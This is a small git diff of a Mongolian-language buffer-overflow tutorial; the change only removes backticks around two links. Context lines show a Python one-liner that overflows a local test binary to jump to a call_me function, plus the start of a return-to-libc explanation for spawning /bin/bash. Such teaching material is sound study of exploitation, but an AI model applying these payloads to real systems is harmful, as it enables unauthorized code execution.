@@ -108,7 +108,7 @@ Missing separate debuginfos, use: debuginfo-install glibc-2.17-222.el7.i686
 080484dd <call_me>:
 ```
 
-фүнкцийн санах ой дээрх хаяг олдлоо. үүнийг stack руу бичих тул `[little endian](https://chortle.ccsu.edu/AssemblyTutorial/Chapter-15/ass15_3.html)` буюу урвуугаар бичнэ.
+фүнкцийн санах ой дээрх хаяг олдлоо. үүнийг stack руу бичих тул [little endian](https://chortle.ccsu.edu/AssemblyTutorial/Chapter-15/ass15_3.html) буюу урвуугаар бичнэ.
 ``` 
 [root@rea home]# python -c 'print "A"*128 + "BBBB"+"\xdd\x84\x04\x08"' | ./notused
 [+] Feed me more!!!
@@ -117,7 +117,7 @@ Mon Oct  8 17:13:01 +08 2018
 
 бидний хүссэн call_me -г дуудаж чадлаа. Одоо харин `system(/bin/bash)` хэрхэн дуудах вэ? 
 
-Үүнд бид `[Return-to-Libc](https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf)` аргыг ашиглах юм.  Үндсэн санаа нь memory дээр байрших фүнкц утгуудыг дахин дуудаж өөрт ашигтай хувьлбарт оруулан ашиглана. 
+Үүнд бид [Return-to-Libc](https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf) аргыг ашиглах юм.  Үндсэн санаа нь memory дээр байрших фүнкц утгуудыг дахин дуудаж өөрт ашигтай хувьлбарт оруулан ашиглана. 
 
 |Top of stack        |    EBP    | EIP                         | Dummy return addr |    address of /bin/sh string |
 |--------------------|-----------|-----------------------------|-------------------|------------------------------|
